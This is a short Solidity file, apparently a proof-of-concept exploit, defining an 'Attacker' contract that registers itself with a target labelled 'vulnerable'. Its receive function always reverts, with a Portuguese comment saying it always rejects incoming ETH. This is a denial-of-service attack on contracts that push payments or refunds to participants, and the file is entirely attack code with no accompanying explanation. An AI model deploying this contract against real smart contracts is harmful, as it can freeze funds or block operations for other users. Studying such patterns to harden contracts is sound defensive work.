// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Attacker {
    function register(address vulnerable) external {
        (bool ok, ) = vulnerable.call(
            abi.encodeWithSignature("register()")
        );
        require(ok);
    }

    // Sempre reverte ao receber ETH
    receive() external payable {
        revert("nope");
    }
}
